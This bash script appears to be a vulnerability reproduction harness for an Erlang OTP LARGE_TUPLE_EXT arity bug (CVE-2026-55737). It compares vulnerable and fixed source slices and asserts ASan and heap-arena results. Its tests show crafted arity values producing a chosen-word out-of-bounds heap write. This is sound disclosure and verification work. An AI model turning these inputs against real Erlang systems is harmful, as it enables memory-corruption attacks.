#!/bin/bash
# CVE-2026-55737 / GHSA-446w-268v-9462 — Erlang OTP erts LARGE_TUPLE_EXT
# signed/unsigned arity mismatch. Direct-call ASan + heap-arena harness.
# Every run re-extracts the verbatim pinned statements and asserts SHA-256.
# No BEAM build, no daemon, no listener, no network.
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E" vuln fixed
rm -f "$E"/*.out "$E"/*.log "$E"/normalized.txt \
      vuln/*.inc fixed/*.inc p-vuln p-fixed a-vuln-gcc a-vuln-clang a-fixed-gcc
PASS=0
FAIL=0

ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() {
    if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi
}
hasnt() {
    if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi
}
srcsha() { sha256sum "$1" | cut -d' ' -f1; }

# --- pinned bytes -----------------------------------------------------------
[ "$(srcsha ../src/external-c388a2d1.vuln.c)" = \
  39afd73a7e0ab02b1fbdcd3309333c812365cae17c5b4f20726837f2b3098549 ] \
  && ok "pin-vuln-external-sha256" || no "pin-vuln-external-sha256"
[ "$(srcsha ../src/external-c5210b42.fixed.c)" = \
  53fb1c2eef8a418c2c4d92d05bda9b653992f7702cb8015c274e15a6f28ac457 ] \
  && ok "pin-fixed-external-sha256" || no "pin-fixed-external-sha256"
[ "$(srcsha ../src/erl_term-c388a2d1.h)" = \
  8cc7eef5c9c3d3dcbd0ad96fad3aa79b53c9e8e3bf4351a3869c0726b8c93f2d ] \
  && ok "pin-erl-term-header-sha256" || no "pin-erl-term-header-sha256"
[ "$(srcsha ../src/fix-c5210b42.patch)" = \
  456ac0bca8145bf4c51f508fc6d108b137b24702778dca5d736bc3577e5c1b6a ] \
  && ok "pin-fix-patch-sha256" || no "pin-fix-patch-sha256"
[ "$(srcsha driver.c)" = \
  1cdc31e05d33053baa9f36ca346d66bba5dc3a95a66cf3d48ed3f918945620b3 ] \
  && ok "driver-sha256" || no "driver-sha256"

# --- verbatim slices (re-extracted from the pinned files every run) ---------
{ echo '#line 6041 "external-c388a2d1.vuln.c"'
  sed -n '6041,6051p' ../src/external-c388a2d1.vuln.c; } \
  > vuln/decoded_size_case.inc
{ echo '#line 4467 "external-c388a2d1.vuln.c"'
  sed -n '4467,4474p' ../src/external-c388a2d1.vuln.c
  echo '#line 4482 "external-c388a2d1.vuln.c"'
  sed -n '4482,4501p' ../src/external-c388a2d1.vuln.c; } \
  > vuln/dec_term_case.inc
{ echo '#line 6043 "external-c5210b42.fixed.c"'
  sed -n '6043,6056p' ../src/external-c5210b42.fixed.c; } \
  > fixed/decoded_size_case.inc
{ echo '#line 4468 "external-c5210b42.fixed.c"'
  sed -n '4468,4475p' ../src/external-c5210b42.fixed.c
  echo '#line 4483 "external-c5210b42.fixed.c"'
  sed -n '4483,4503p' ../src/external-c5210b42.fixed.c; } \
  > fixed/dec_term_case.inc

[ "$(srcsha vuln/decoded_size_case.inc)" = \
  c029afabe787a69267f23ee329e88ab337d15d33a1e589fd9ecbbbaa2b0308ad ] \
  && ok "verbatim-vuln-decoded-size-sha256" || no "verbatim-vuln-decoded-size-sha256"
[ "$(srcsha vuln/dec_term_case.inc)" = \
  33568005d3f00758832a7cc0f96ef020093ca68f6d1dca4476e04c19cf37572a ] \
  && ok "verbatim-vuln-dec-term-sha256" || no "verbatim-vuln-dec-term-sha256"
[ "$(srcsha fixed/decoded_size_case.inc)" = \
  7f25c450fbc1f5bc6372b780f97b6b6c127367b5d6e1f3e79e13da790c21ee51 ] \
  && ok "verbatim-fixed-decoded-size-sha256" || no "verbatim-fixed-decoded-size-sha256"
[ "$(srcsha fixed/dec_term_case.inc)" = \
  5fd7da30d7b3fa83fb27fc38e4af20d9d579e5671d6b67d4acec2eeafe9e1f07 ] \
  && ok "verbatim-fixed-dec-term-sha256" || no "verbatim-fixed-dec-term-sha256"
[ "$(grep -cF 'n = get_uint32(ep)' vuln/decoded_size_case.inc)" = 1 ] \
  && ok "vuln-decoded-uses-uint32" || no "vuln-decoded-uses-uint32"
[ "$(grep -cF 'n = get_int32(ep)' vuln/dec_term_case.inc)" = 1 ] \
  && ok "vuln-decode-uses-int32" || no "vuln-decode-uses-int32"
[ "$(grep -cF 'ERTS_MAX_TUPLE_SIZE' fixed/decoded_size_case.inc)" = 1 ] \
  && ok "fixed-has-arity-cap" || no "fixed-has-arity-cap"
[ "$(grep -cF 'hp += n' vuln/dec_term_case.inc)" = 1 ] \
  && ok "vuln-has-backward-hp" || no "vuln-has-backward-hp"
[ "$(grep -cF 'ASSERT(n > 0 && n <= ERTS_MAX_TUPLE_SIZE)' fixed/dec_term_case.inc)" = 1 ] \
  && ok "fixed-dec-term-assert" || no "fixed-dec-term-assert"

# --- build ------------------------------------------------------------------
cc -O0 -g -std=c11 -o p-vuln driver.c 2> "$E/build-p-vuln.log" \
  && ok "build-plain-vuln" || no "build-plain-vuln"
cc -O0 -g -std=c11 -fsanitize=address -o a-vuln-gcc driver.c \
  2> "$E/build-a-vuln-gcc.log" && ok "build-asan-gcc-vuln" || no "build-asan-gcc-vuln"
if command -v clang >/dev/null 2>&1; then
  clang -O0 -g -std=c11 -fsanitize=address -o a-vuln-clang driver.c \
    2> "$E/build-a-vuln-clang.log" && ok "build-asan-clang-vuln" || no "build-asan-clang-vuln"
else
  no "build-asan-clang-vuln"
fi
cc -O0 -g -std=c11 -DFIXED_VARIANT -o p-fixed driver.c \
  2> "$E/build-p-fixed.log" && ok "build-plain-fixed" || no "build-plain-fixed"
cc -O0 -g -std=c11 -DFIXED_VARIANT -fsanitize=address -o a-fixed-gcc driver.c \
  2> "$E/build-a-fixed-gcc.log" && ok "build-asan-gcc-fixed" || no "build-asan-gcc-fixed"

# --- rung 1: advisory wire value, arithmetic only ---------------------------
./p-vuln arith 80000000 0 > "$E/arith-vuln.out" 2>&1
has "$E/arith-vuln.out" 'UINT=2147483648' 'r1-unsigned-advisory-arity'
has "$E/arith-vuln.out" 'SIGNED=-2147483648' 'r1-signed-advisory-arity'
has "$E/arith-vuln.out" 'HP_PLUS_N_BYTES=-17179869184' 'r1-hp-plus-n-advisory'
has "$E/arith-vuln.out" 'DELTA_BYTES=-17179869176' 'r1-advisory-backward-displacement'
has "$E/arith-vuln.out" 'DECODED_SIZE_RC=2147483649' 'r1-vuln-validation-passes'
./p-fixed arith 80000000 0 > "$E/arith-fixed.out" 2>&1
has "$E/arith-fixed.out" 'DECODED_SIZE_RC=-1' 'r1-fixed-validation-rejects'

# --- rung 2 + rung 4: chosen word at chosen negative offset, plain arena ----
for spec in 'fffffffe:-1:32760' 'fffffffd:-2:32752' 'fffffffc:-3:32744' 'fffffff8:-7:32712'; do
  wire=${spec%%:*}; rest=${spec#*:}; dw=${rest%%:*}; off=${rest##*:}
  tag=${wire#ffffff}
  ./p-vuln plain "$wire" 4141414141414141 > "$E/plain-vuln-$tag.out" 2>&1
  out="$E/plain-vuln-$tag.out"
  has "$out" "DELTA_WORDS=$dw" "r1-delta-$tag"
  has "$out" "WRITE_OFF_BYTES=$off" "r2-oob-offset-$tag"
  has "$out" 'PRE=eeeeeeeeeeeeeeee' "r2-canary-before-$tag"
  has "$out" 'READBACK=4141414141414141' "r4-chosen-word-$tag"
  has "$out" 'POST=4141414141414141' "r4-chosen-bytes-$tag"
done

# --- rung 3: ASan, backward write into the left redzone ---------------------
./a-vuln-gcc asan fffffffe 5a5a5a5a5a5a5a5a > "$E/vuln-gcc-asan.out" 2>&1
has "$E/vuln-gcc-asan.out" 'ERROR: AddressSanitizer: heap-buffer-overflow' 'r3-gcc-asan-overflow'
has "$E/vuln-gcc-asan.out" 'WRITE of size 8' 'r3-gcc-asan-write8'
has "$E/vuln-gcc-asan.out" '8 bytes before 64-byte region' 'r3-gcc-asan-left-of-region'
if [ -x a-vuln-clang ]; then
  ./a-vuln-clang asan fffffffe 5a5a5a5a5a5a5a5a > "$E/vuln-clang-asan.out" 2>&1
  has "$E/vuln-clang-asan.out" 'ERROR: AddressSanitizer: heap-buffer-overflow' 'r3-clang-asan-overflow'
  has "$E/vuln-clang-asan.out" 'WRITE of size 8' 'r3-clang-asan-write8'
fi

# --- fixed control: rejected in decoded_size, no write ----------------------
./p-fixed plain fffffffe 4141414141414141 > "$E/fixed-gcc-safe.out" 2>&1
has "$E/fixed-gcc-safe.out" 'DECODED_SIZE_RC=-1' 'fixed-rejects-backward-arity'
has "$E/fixed-gcc-safe.out" 'WRITE_SKIPPED=1' 'fixed-skips-consumer-write'
hasnt "$E/fixed-gcc-safe.out" 'READBACK=' 'fixed-no-readback'
./a-fixed-gcc asan fffffffe 5a5a5a5a5a5a5a5a > "$E/fixed-gcc-asan.out" 2>&1
hasnt "$E/fixed-gcc-asan.out" 'ERROR: AddressSanitizer' 'fixed-asan-clean'
has "$E/fixed-gcc-asan.out" 'WRITE_SKIPPED=1' 'fixed-asan-rejects'

# --- safe control: small positive arity stays in bounds --------------------
./p-vuln plain 00000003 4242424242424242 > "$E/vuln-gcc-safe.out" 2>&1
has "$E/vuln-gcc-safe.out" 'DECODED_SIZE_RC=4' 'safe-decoded-size-4'
has "$E/vuln-gcc-safe.out" 'WRITE_OFF_BYTES=32800' 'safe-inbounds-offset'
has "$E/vuln-gcc-safe.out" 'READBACK=4242424242424242' 'safe-inbounds-write'
has "$E/vuln-gcc-safe.out" 'CANARY_MINUS2=eeeeeeeeeeeeeeee' 'safe-canary-intact'
./a-vuln-gcc asan 00000003 4242424242424242 > "$E/vuln-gcc-asan-safe.out" 2>&1
hasnt "$E/vuln-gcc-asan-safe.out" 'ERROR: AddressSanitizer' 'safe-asan-clean'

# --- deterministic normalized trace ----------------------------------------
{
  cat "$E/arith-vuln.out" "$E/arith-fixed.out"
  for spec in 'fffffffe' 'fffffffd' 'fffffffc' 'fffffff8'; do
    cat "$E/plain-vuln-${spec#ffffff}.out"
  done
  grep -F -e 'SCENARIO=' -e 'DECODED_SIZE_RC=' -e 'DELTA_WORDS=' \
       -e 'WRITE_OFF_BYTES=' -e 'READBACK=' -e 'WRITE_SKIPPED=' \
       "$E/vuln-gcc-asan.out" "$E/vuln-clang-asan.out" \
       "$E/fixed-gcc-asan.out" "$E/vuln-gcc-asan-safe.out" 2>/dev/null
  grep -F -e 'ERROR: AddressSanitizer: heap-buffer-overflow' -e 'WRITE of size 8' \
       "$E/vuln-gcc-asan.out" "$E/vuln-clang-asan.out" 2>/dev/null
} | grep -v -E '0x[0-9a-f]{6,}|#[0-9]+ ' > "$E/normalized.txt"
TRACE=$(srcsha "$E/normalized.txt")
printf 'TRACE_SHA256=%s\n' "$TRACE"

printf 'PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
